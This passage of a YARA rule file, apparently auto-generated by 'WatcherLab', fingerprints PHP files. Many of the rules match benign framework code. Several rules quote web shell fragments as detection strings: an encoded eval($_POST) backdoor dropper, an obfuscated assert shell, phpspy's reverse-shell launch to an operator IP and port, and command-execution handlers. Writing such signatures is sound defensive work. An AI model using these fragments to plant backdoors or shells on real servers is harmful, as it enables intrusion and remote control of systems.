      $s8 = "return $this->eventCategory->getByHandle($handle);" fullword ascii
      $s9 = "public function setPreferredViewToList()" fullword ascii
      $s10 = "public function setPreferredViewToGrid()" fullword ascii
      $s11 = "use Concrete\\Core\\Attribute\\Category\\EventCategory;" fullword ascii
      $s12 = "$this->session->set('calendar.view', 'grid');" fullword ascii
      $s13 = "$this->session->set('calendar.view', 'list');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule PHPluanma
{
   meta:
      description = "php22 - file PHPluanma.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "faa976c6761008056af80a9a22baace09b658e3b6286643bdbd7ab741af448ca"
   strings:
      $s1 = "?a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};" fullword ascii
      $s2 = "=\"multipart/form-data\"><input name=\"upfile\" type=\"file\"><input type=\"submit\" value=\"ok\"></form><?php }?>" fullword ascii
      $s3 = "<?php if($_GET[\"woaini\"]==\"91ri\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if" ascii
      $s4 = "<?php if($_GET[\"woaini\"]==\"91ri\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if" ascii
      $s5 = "sts($_FILES[\"upfile\"][\"name\"])){ copy($_FILES[\"upfile\"][\"tmp_name\"], $_FILES[\"upfile\"][\"name\"]); }}?><form method=\"" ascii
      $s6 = "<?php $_GET[a]($_GET[b]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule PodsView
{
   meta:
      description = "php22 - file PodsView.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "028b20b110b902bed0d4f01a265e8127cdc2efddec9b6a8f75c74c64ae66968b"
   strings:
      $s1 = "* Get the cache key, salted with current Pods version, peppered with md5 if too long" fullword ascii
      $s2 = "} elseif ( file_exists( realpath( get_template_directory() . '/' . $_real_view ) ) ) {" fullword ascii
      $s3 = "* @param array|null     $data       (optional) Data to pass on to the template" fullword ascii
      $s4 = "* Override the value of $view. For example, using Pods AJAX View." fullword ascii
      $s5 = "public static function get_template_part( $_view, $_data = null ) {" fullword ascii
      $s6 = "* @param null|bool      If          not set to null, this filter overrides the rest of the method." fullword ascii
      $s7 = "* To use, set first param to true. If that param in not null, this method returns its value." fullword ascii
      $s8 = "$value = apply_filters( 'pods_view_cache_alt_get_value', $value, $cache_mode, $group_key . $key, $original_key, $group );" fullword ascii
      $s9 = "$output = self::get_template_part( $view, $data );" fullword ascii
      $s10 = "if ( apply_filters( 'pods_view_cache_alt_get', false, $cache_mode, $group_key . $key, $original_key, $group ) ) {" fullword ascii
      $s11 = "if ( ( isset( $expires['anonymous'] ) || isset( $expires['user_with_access'] ) ) && isset( $expires['user'] ) ) {" fullword ascii
      $s12 = "$wpdb->query( \"DELETE FROM `{$wpdb->options}` WHERE option_name LIKE '_site_transient_{$group_key}%'\" );" fullword ascii
      $s13 = "$located = realpath( get_template_directory() . '/' . $_real_view );" fullword ascii
      $s14 = "$timeout = wp_cache_get( '_timeout_' . $key, ( empty( $group ) ? 'pods_option_cache' : $group ) );" fullword ascii
      $s15 = "$wpdb->query( \"DELETE FROM `{$wpdb->options}` WHERE option_name LIKE '_transient_{$group_key}%'\" );" fullword ascii
      $s16 = "public static function get_key( $key, $group_key = '' ) {" fullword ascii
      $s17 = "if ( file_exists( realpath( get_stylesheet_directory() . '/' . $_real_view ) ) ) {" fullword ascii
      $s18 = "$value = apply_filters( 'pods_view_get_' . $cache_mode, $value, $original_key, $group );" fullword ascii
      $s19 = "public static function get( $key, $cache_mode = 'cache', $group = '', $callback = null ) {" fullword ascii
      $s20 = "for ( $_view_x = $_view_count; 0 < $_view_x; $_view_x -- ) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule posts_tag_fixture
{
   meta:
      description = "php22 - file posts_tag_fixture.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9aa26faa651f1a427203198bb763fb523dd3f2c97324038fd9ca8271ef241ae7"
   strings:
      $s1 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s2 = "* @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License" fullword ascii
      $s3 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s4 = "* CakePHP(tm) Tests <http://book.cakephp.org/view/1196/Testing>" fullword ascii
      $s5 = "* @var string 'PostsTag'" fullword ascii
      $s6 = "'indexes' => array('posts_tag' => array('column' => array('tag_id', 'post_id'), 'unique' => 1))" fullword ascii
      $s7 = "*  Redistributions of files must retain the above copyright notice." fullword ascii
      $s8 = "* @link          http://book.cakephp.org/view/1196/Testing CakePHP(tm) Tests" fullword ascii
      $s9 = "*  Licensed under The Open Group Test Suite License" fullword ascii
      $s10 = "* Short description for file." fullword ascii
      $s11 = "'post_id' => array('type' => 'integer', 'null' => false)," fullword ascii
      $s12 = "* Short description for class." fullword ascii
      $s13 = "array('post_id' => 2, 'tag_id' => 'tag1')," fullword ascii
      $s14 = "array('post_id' => 1, 'tag_id' => 'tag2')," fullword ascii
      $s15 = "array('post_id' => 2, 'tag_id' => 'tag3')" fullword ascii
      $s16 = "array('post_id' => 1, 'tag_id' => 'tag1')," fullword ascii
      $s17 = "* fields property" fullword ascii
      $s18 = "* records property" fullword ascii
      $s19 = "* name property" fullword ascii
      $s20 = "var $name = 'PostsTag';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ProcessingConfigurationLoaderSpec
{
   meta:
      description = "php22 - file ProcessingConfigurationLoaderSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3914bf1757d3f189a72a8973eda8a9d446c022c74b664bfac8cdb69575819cbd"
   strings:
      $x1 = "function let(ConfigurationLoaderInterface $decoratedLoader, ConfigurationProcessorInterface $configurationProcessor): void" fullword ascii
      $x2 = "$this->beConstructedWith($decoratedLoader, $configurationProcessor);" fullword ascii
      $s3 = "final class ProcessingConfigurationLoaderSpec extends ObjectBehavior" fullword ascii
      $s4 = "function it_processes_the_configuration_and_extracts_extra_sylius_theme_key_as_another_configuration(" fullword ascii
      $s5 = "use Sylius\\Bundle\\ThemeBundle\\Configuration\\Filesystem\\ConfigurationLoaderInterface;" fullword ascii
      $s6 = "use Sylius\\Bundle\\ThemeBundle\\Configuration\\ConfigurationProcessorInterface;" fullword ascii
      $s7 = "$decoratedLoader->load('theme-configuration-resource')->willReturn($basicConfiguration);" fullword ascii
      $s8 = "$configurationProcessor->process([$basicConfiguration])->willReturn([" fullword ascii
      $s9 = "ConfigurationProcessorInterface $configurationProcessor" fullword ascii
      $s10 = "function it_processes_the_configuration(" fullword ascii
      $s11 = "$configurationProcessor->process([" fullword ascii
      $s12 = "ConfigurationLoaderInterface $decoratedLoader," fullword ascii
      $s13 = "$this->shouldImplement(ConfigurationLoaderInterface::class);" fullword ascii
      $s14 = "function it_implements_loader_interface(): void" fullword ascii
      $s15 = "namespace spec\\Sylius\\Bundle\\ThemeBundle\\Configuration\\Filesystem;" fullword ascii
      $s16 = "$this->load('theme-configuration-resource')->shouldReturn([" fullword ascii
      $s17 = "$basicConfiguration = ['name' => 'example/sylius-theme'];" fullword ascii
      $s18 = "$basicConfiguration = [" fullword ascii
      $s19 = "'name' => 'example/brand-new-sylius-theme'," fullword ascii
      $s20 = "['name' => 'example/brand-new-sylius-theme']," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule processes
{
   meta:
      description = "php22 - file processes.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dde25257af9d94eace20edb86c40b35fe7d74a63129cf4bb77606c5bcd97ce2e"
   strings:
      $x1 = "$cmd = execute(\"taskkill /F /PID \".$pid);" fullword ascii
      $x2 = "$cmd = trim(execute(\"ps -p \".$pid));" fullword ascii
      $s3 = "$cmd = execute(\"tasklist /FI \\\"PID eq \".$pid.\"\\\"\");" fullword ascii
      $s4 = "if((strpos($cmd, \"such process\")===false)&&(strpos($cmd, \"not permitted\")===false)){" fullword ascii
      $s5 = "$cmd = execute(\"kill -9 \".$pid);" fullword ascii
      $s6 = "$GLOBALS['module']['processes']['content'] = \"\";" fullword ascii
      $s7 = "$GLOBALS['module']['processes']['js_ontabselected'] = \"show_processes();\";" fullword ascii
      $s8 = "$res = execute($cmd);" fullword ascii
      $s9 = "$GLOBALS['module']['processes']['title'] = \"Processes\";" fullword ascii
      $s10 = "$GLOBALS['module']['processes']['id'] = \"processes\";" fullword ascii
      $s11 = "if($processes!==false) output($processes);" fullword ascii
      $s12 = "if(strpos($cmd,\"No tasks are running\")!==false) $counter++;" fullword ascii
      $s13 = "if(!function_exists('show_processes')){" fullword ascii
      $s14 = "$processes = show_processes();" fullword ascii
      $s15 = "function show_processes(){" fullword ascii
      $s16 = "if(isset($p['showProcesses'])){" fullword ascii
      $s17 = "$cmd = \"tasklist /V /FO csv\";" fullword ascii
      $s18 = "if($tblcount == count($psln)) $output .= \"<td style='text-align:left;'>\".$p.\"</td>\";" fullword ascii
      $s19 = "foreach($psln as $p) $output .= \"<th>\".trim(trim(strtolower($p)) ,\"\\\"\").\"</th>\";" fullword ascii
      $s20 = "$check = explode(\"\\n\", $cmd);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule php22_psot01
{
   meta:
      description = "php22 - file psot01.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3827c8f4c9819a817070d089889c6fa3979b14b5e9a9195ae2243334cb2b75e5"
   strings:
      $s1 = "<?php @$_++;$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\")." fullword ascii
      $s2 = "0=assert&1=system(dir)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule phpspy2009withMSSQL
{
   meta:
      description = "php22 - file phpspy2009withMSSQL.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c5692bd52a09abd2d2fd3c4de5ac4ddda3923ae855899f0ddf912d9862843f89"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x4 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $x6 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x7 = "Copyright (C) 2004-2009 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $x8 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s9 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s10 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s11 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s12 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
      $s13 = "echo(execute($command));" fullword ascii
      $s14 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
      $s15 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s16 = "join sysusers on sysobjects.uid = sysusers.uid where sysobjects.xtype = 'U' order by sysobjects.name asc\");" fullword ascii
      $s17 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s18 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s19 = "$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");" fullword ascii
      $s20 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule PaymentRepository
{
   meta:
      description = "php22 - file PaymentRepository.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "948065c206d8dcc84718c18df62c22401ae63522517efcb82cb8966a51bbeb14"
   strings:
      $s1 = "use Sylius\\Component\\Core\\Repository\\PaymentRepositoryInterface;" fullword ascii
      $s2 = "public function findOneByOrderId($paymentId, $orderId): ?PaymentInterface" fullword ascii
      $s3 = "use Sylius\\Component\\Core\\Model\\PaymentInterface;" fullword ascii
      $s4 = "use Sylius\\Bundle\\ResourceBundle\\Doctrine\\ORM\\EntityRepository;" fullword ascii
      $s5 = "->getOneOrNullResult()" fullword ascii
      $s6 = "namespace Sylius\\Bundle\\CoreBundle\\Doctrine\\ORM;" fullword ascii
      $s7 = "public function createListQueryBuilder(): QueryBuilder" fullword ascii
      $s8 = "class PaymentRepository extends EntityRepository implements PaymentRepositoryInterface" fullword ascii
      $s9 = "->getQuery()" fullword ascii
      $s10 = "use Doctrine\\ORM\\QueryBuilder;" fullword ascii
      $s11 = "return $this->createQueryBuilder('o');" fullword ascii
      $s12 = "return $this->createQueryBuilder('o')" fullword ascii
      $s13 = "->andWhere('o.order = :orderId')" fullword ascii
      $s14 = "->setParameter('paymentId', $paymentId)" fullword ascii
      $s15 = "->setParameter('orderId', $orderId)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}


rule ProxyLogger
{
   meta:
      description = "php22 - file ProxyLogger.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a9da5bbf89724aebe2032f15c737ea1d42ec265224f91abcdbe754d8ada9a60"
   strings:
      $s1 = "* Copyright 2015-2018 info@neomerx.com" fullword ascii
      $s2 = "$this->logger === null ?: $this->logger->log($level, $message, $context);" fullword ascii
      $s3 = "* http://www.apache.org/licenses/LICENSE-2.0" fullword ascii
      $s4 = "class ProxyLogger extends AbstractLogger" fullword ascii
      $s5 = "use Psr\\Log\\AbstractLogger;" fullword ascii
      $s6 = "use Psr\\Log\\LoggerAwareTrait;" fullword ascii
      $s7 = "public function log($level, $message, array $context = [])" fullword ascii
      $s8 = "use LoggerAwareTrait;" fullword ascii
      $s9 = "* @package Neomerx\\JsonApi" fullword ascii
      $s10 = "* @inheritdoc" fullword ascii
      $s11 = "<?php namespace Neomerx\\JsonApi\\Factories;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule OptionsConfig
{
   meta:
      description = "php22 - file OptionsConfig.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4630a1dd9cd285c5a8a7815427d8d1984f58435de0048a77c751f01f28104371"
   strings:
      $s1 = "* (c) Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s2 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s3 = "* This file is part of PhpSpec, A php toolset to drive emergent" fullword ascii
      $s4 = "* @param bool $stopOnFailureEnabled" fullword ascii
      $s5 = "* @param bool $reRunEnabled" fullword ascii
      $s6 = "* @param bool $codeGenerationEnabled" fullword ascii
      $s7 = "* @param string|bool $bootstrapPath" fullword ascii
      $s8 = "* @param bool $fakingEnabled" fullword ascii
      $s9 = "$this->stopOnFailureEnabled  = $stopOnFailureEnabled;" fullword ascii
      $s10 = "public function getBootstrapPath()" fullword ascii
      $s11 = "private $stopOnFailureEnabled;" fullword ascii
      $s12 = "public function isStopOnFailureEnabled(): bool" fullword ascii
      $s13 = "private $reRunEnabled;" fullword ascii
      $s14 = "return $this->stopOnFailureEnabled;" fullword ascii
      $s15 = "$this->reRunEnabled = $reRunEnabled;" fullword ascii
      $s16 = "public function isReRunEnabled()" fullword ascii
      $s17 = "* design by specification." fullword ascii
      $s18 = "return $this->reRunEnabled;" fullword ascii
      $s19 = "namespace PhpSpec\\Config;" fullword ascii
      $s20 = "$this->codeGenerationEnabled = $codeGenerationEnabled;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule OrderItemRepositoryInterface
{
   meta:
      description = "php22 - file OrderItemRepositoryInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "21e7ff0462ff5eb15d8aecbc1b6ad8be8119999d42dcd1b281ce14b46c41fe7c"
   strings:
      $s1 = "* @return OrderItemInterface|null" fullword ascii
      $s2 = "use Sylius\\Component\\Resource\\Repository\\RepositoryInterface;" fullword ascii
      $s3 = "use Sylius\\Component\\Order\\Model\\OrderItemInterface;" fullword ascii
      $s4 = "namespace Sylius\\Component\\Order\\Repository;" fullword ascii
      $s5 = "interface OrderItemRepositoryInterface extends RepositoryInterface" fullword ascii
      $s6 = "* @param mixed $cartId" fullword ascii
      $s7 = "public function findOneByIdAndCartId($id, $cartId): ?OrderItemInterface;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule phpmailer_lang_bg
{
   meta:
      description = "php22 - file phpmailer.lang-bg.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b62f2e65983d1fd9b26b443e0f65c34926055f627315f1164aaa70cf2802c8ce"
   strings:
      $s1 = "* @author Mikhail Kyosev <mialygk@gmail.com>" fullword ascii
      $s2 = "* Bulgarian PHPMailer language file: refer to English translation for definitive list" fullword ascii
      $s3 = "$PHPMAILER_LANG['mailer_not_supported'] = ' - " fullword ascii
      $s4 = "$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP " fullword ascii
      $s5 = "$PHPMAILER_LANG['connect_host']         = 'SMTP " fullword ascii
      $s6 = "$PHPMAILER_LANG['execute']              = '" fullword ascii
      $s7 = "$PHPMAILER_LANG['recipients_failed']    = 'SMTP " fullword ascii
      $s8 = "$PHPMAILER_LANG['smtp_error']           = 'SMTP " fullword ascii
      $s9 = "$PHPMAILER_LANG['data_not_accepted']    = 'SMTP " fullword ascii
      $s10 = "SMTP " fullword ascii
      $s11 = "$PHPMAILER_LANG['authenticate']         = 'SMTP " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule php22_pick
{
   meta:
      description = "php22 - file pick.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "40c40a9e475bd662d0e4c6b30d65c3c15e10f45164a65e600494cbf4fc23fb32"
   strings:
      $s1 = "* Hook into user updating process to bail on redirect." fullword ascii
      $s2 = "// How many data items to limit to (autocomplete defaults to 30, set to -1 or 1+ to override)." fullword ascii
      $s3 = "$lookup_where['post_content'] = \"`t`.`post_content` LIKE '%\" . pods_sanitize_like( $data_params['query'] ) . \"%'\";" fullword ascii
      $s4 = "* Hook into term updating process to bail on redirect." fullword ascii
      $s5 = "$lookup_where['user_login']   = \"`t`.`user_login` LIKE '%\" . pods_sanitize_like( $data_params['query'] ) . \"%'\";" fullword ascii
      $s6 = "$data = array( '' => pods_v( self::$type . '_select_text', $options, __( '-- Select One --', 'pods' ), true ) ) + $data;" fullword ascii
      $s7 = "self::$type . '_object' => array( '^post-type-(?!(custom-css|customize-changeset)).*$', '^taxonomy-.*$', '^user$', '^pod-.*$' )" fullword ascii
      $s8 = "* @param bool $ignore_internal Default is true, when set to false Pods internal content types can not be extended." fullword ascii
      $s9 = "* @param array|null $select2_overrides Override options for Select2/SelectWoo" fullword ascii
      $s10 = "$lookup_where['post_excerpt'] = \"`t`.`post_excerpt` LIKE '%\" . pods_sanitize_like( $data_params['query'] ) . \"%'\";" fullword ascii
      $s11 = "add_action( 'pods_api_processed_form', array( $this, 'admin_modal_bail_pod' ), 10, 3 );" fullword ascii
      $s12 = "$args->options['supports_thumbnails'] = post_type_supports( $args->options['pick_val'], 'thumbnail' );" fullword ascii
      $s13 = "* Prevent ability to extend core Pods content types." fullword ascii
      $s14 = "if ( in_array( pods_v( self::$type . '_format_single', $options, 'dropdown' ), array( 'autocomplete', 'list' ) ) ) {" fullword ascii
      $s15 = "* Loop through relationship data and expand item data with additional information for DFV." fullword ascii
      $s16 = "* @param boolean      $raw     Whether to return the raw list of keys (true) or convert to key=>value (false)" fullword ascii
      $s17 = "* Filter on whether to allow modals to be used on the front of the site (in an non-admin area)." fullword ascii
      $s18 = "$iframe['title_edit'] = sprintf( __( '%s: Edit', 'pods' ), $args->options['label'] );" fullword ascii
      $s19 = "$iframe['title_add'] = sprintf( __( '%s: Add New', 'pods' ), $args->options['label'] );" fullword ascii
      $s20 = "public function data_post_stati( $name = null, $value = null, $options = null, $pod = null, $id = null ) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule PHP_Shell_php
{
   meta:
      description = "php22 - file PHP_Shell.php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"
   strings:
      $x1 = "echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii
      $x2 = "elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii
      $x3 = "is coded for unsecure servers, if your server is secured the script will hide commands" fullword ascii
      $x4 = "elseif ( $cmd==\"uploadproc\" ) { /* <!-- Process Uploaded file --> */" fullword ascii
      $x5 = "<input name=\"submit_btn\" class=\"inputbutton\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii
      $s6 = "<br>PHPKonsole is just a little telnet like shell wich allows you to run commands on the webserver." fullword ascii
      $s7 = "/* HTTP Authorisation password, uncomment if you want to use this */" fullword ascii
      $s8 = "When you run commands they will run as the webservers UserID. This should work perfectly" fullword ascii
      $s9 = "elseif ( $cmd==\"edit\" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */" fullword ascii
      $s10 = "/* <!-- Execute --> */" fullword ascii
      $s11 = "<center>&nbsp;<?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp;</center>" fullword ascii
      $s12 = "header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii
      $s13 = "*                               DRAZZ01@HOTMAIL.COM                                     * " fullword ascii
      $s14 = "<font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font>" fullword ascii
      $s15 = "elseif ( $cmd==\"newdir\" ) { /*<!-- Create new directory with default name --> */" fullword ascii
      $s16 = "elseif ( $cmd==\"saveedit\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii
      $s17 = "elseif ( $cmd==\"deldir\" ) { /*<!-- Delete a directory and all it's files --> */" fullword ascii
      $s18 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii
      $s19 = "server supports php and the execute commands...<br><br>" fullword ascii
      $s20 = "for managing files, like moving, copying etc. If you're using a linux server, system commands" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}


rule ProductVariantController
{
   meta:
      description = "php22 - file ProductVariantController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4faf96abd4f48541e4f785b38dd0442129545fd871961f4c657ec6daee232206"
   strings:
      $s1 = "if ($configuration->isCsrfProtectionEnabled() && !$this->isCsrfTokenValid('update-product-variant-position', $request->r" fullword ascii
      $s2 = "use Symfony\\Component\\HttpKernel\\Exception\\HttpException;" fullword ascii
      $s3 = "if (in_array($request->getMethod(), ['POST', 'PUT', 'PATCH'], true) && null !== $productVariantsToUpdate) {" fullword ascii
      $s4 = "$this->isGrantedOr403($configuration, ResourceActions::UPDATE);" fullword ascii
      $s5 = "throw new HttpException(Response::HTTP_FORBIDDEN, 'Invalid csrf token.');" fullword ascii
      $s6 = "sprintf('The product variant position \"%s\" is invalid.', $productVariantToUpdate['position'])" fullword ascii
      $s7 = "$configuration = $this->requestConfigurationFactory->create($this->metadata, $request);" fullword ascii
      $s8 = "* @throws HttpException" fullword ascii
      $s9 = "$productVariantsToUpdate = $request->get('productVariants');" fullword ascii
      $s10 = "use Symfony\\Component\\HttpFoundation\\JsonResponse;" fullword ascii
      $s11 = "use Symfony\\Component\\HttpFoundation\\Response;" fullword ascii
      $s12 = "if ($configuration->isCsrfProtectionEnabled() && !$this->isCsrfTokenValid('update-product-variant-position', $request->request->" ascii
      $s13 = "* @param Request $request" fullword ascii
      $s14 = "equest->get('_csrf_token'))) {" fullword ascii
      $s15 = "$productVariant = $this->repository->findOneBy(['id' => $productVariantToUpdate['id']]);" fullword ascii
      $s16 = "use Sylius\\Component\\Core\\Model\\ProductVariantInterface;" fullword ascii
      $s17 = "/** @var ProductVariantInterface $productVariant */" fullword ascii
      $s18 = "use Sylius\\Component\\Resource\\ResourceActions;" fullword ascii
      $s19 = "$productVariant->setPosition((int) $productVariantToUpdate['position']);" fullword ascii
      $s20 = "use Sylius\\Bundle\\ResourceBundle\\Controller\\ResourceController;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule ObjectsMetadata
{
   meta:
      description = "php22 - file ObjectsMetadata.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8031847ec7f39eb9bc6f782fd68644f19aa473fece4735046a03a286e075bfdb"
   strings:
      $s1 = "* Rewrites id from source to target, $idMapping contains" fullword ascii
      $s2 = "throw new \\Exception('invalid data passed to getDataForQueryResource - must be array');" fullword ascii
      $s3 = "throw new \\Exception('cannot get values from web service import - references unknown object with id [ '.$item['id'].' ]');" fullword ascii
      $s4 = "throw new \\Exception('cannot get values from web service import - references unknown object with id [ '." fullword ascii
      $s5 = "public function processDiffDataForEditMode($originalData, $data, $object = null, $params = [])" fullword ascii
      $s6 = "/** Override point for Enriching the layout definition before the layout is returned to the admin interface." fullword ascii
      $s7 = "throw new \\Exception('cannot get values from web service import - invalid data');" fullword ascii
      $s8 = "throw new Element\\ValidationException('Invalid object relation to object ['.$id.'] in field ' . $this->getName(), null, null);" fullword ascii
      $s9 = "* @see DataObject\\ClassDefinition\\Data::getVersionPreview" fullword ascii
      $s10 = "$target = Element\\Service::getElementById($type, $id);" fullword ascii
      $s11 = "$temp = \\Pimcore::getContainer()->get('pimcore.model.factory')" fullword ascii
      $s12 = "public function getFromWebserviceImport($value, $object = null, $params = [], $idMapper = null)" fullword ascii
      $s13 = "if ($source instanceof DataObject\\Concrete && $destination instanceof DataObject\\Concrete && $destination->getCl" fullword ascii
      $s14 = "$item = new DataObject\\Data\\ObjectMetadata($fieldname, $columns, $target);" fullword ascii
      $s15 = "$idMapper->recordMappingFailure('object', $object->getId(), 'object', $item['id']);" fullword ascii
      $s16 = "$sql = $db->quoteInto('o_id = ?', $objectId) . ' AND ' . $db->quoteInto('fieldname = ?', $this->getName())" fullword ascii
      $s17 = "throw new Element\\ValidationException('Invalid object relation to object ['.$id.'] in field ' . $this->getNa" fullword ascii
      $s18 = "* converts object data to a simple string value or CSV Export" fullword ascii
      $s19 = "$newElement = Element\\Service::getElementById($type, $idMapping[$type][$id]);" fullword ascii
      $s20 = "* @see Model\\DataObject\\ClassDefinition\\Data::getDataFromEditmode" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule PhpCommentsPreserved
{
   meta:
      description = "php22 - file PhpCommentsPreserved.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "611df183c41c18ae15cb0571361cb3568c7bb1302bb7a6753ece4ad821fbc816"
   strings:
      $s1 = "* This is to check if comments are being stripped (Doctrine ORM depends on comments not being stripped)." fullword ascii
      $s2 = "* @see PreconditionInterface::getUniqueIdentifier()" fullword ascii
      $s3 = "* @see PreconditionInterface::getName()" fullword ascii
      $s4 = "$reflectionProperty = $reflectionObject->getProperty('docCommentCanary');" fullword ascii
      $s5 = "if (!$reflectionProperty->getDocComment()) {" fullword ascii
      $s6 = "->setMessage(t('concrete5 is not compatible with opcode caches that strip PHP comments. Certain configurations o" fullword ascii
      $s7 = "* @see PreconditionInterface::performCheck()" fullword ascii
      $s8 = "* @see PreconditionInterface::isOptional()" fullword ascii
      $s9 = "public function getUniqueIdentifier()" fullword ascii
      $s10 = "return t('PHP Comments Preserved');" fullword ascii
      $s11 = "use Concrete\\Core\\Install\\PreconditionInterface;" fullword ascii
      $s12 = "use Concrete\\Core\\Install\\PreconditionResult;" fullword ascii
      $s13 = "namespace Concrete\\Core\\Install\\Preconditions;" fullword ascii
      $s14 = "->setState(PreconditionResult::STATE_FAILED)" fullword ascii
      $s15 = "return 'php_comments_preserved';" fullword ascii
      $s16 = "f eAccelerator and Zend opcode caching may use this behavior, and it must be disabled.'))" fullword ascii
      $s17 = "class PhpCommentsPreserved implements PreconditionInterface" fullword ascii
      $s18 = "$reflectionObject = new ReflectionObject($this);" fullword ascii
      $s19 = "$result = new PreconditionResult();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule pingback
{
   meta:
      description = "php22 - file pingback.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "30587fbe3606d3b13ef4a0a4bdf4ce6743f3983a046f4a41892666fb3ef43608"
   strings:
      $s1 = "This file is part of the Fat-Free Framework (http://fatfreeframework.com)." fullword ascii
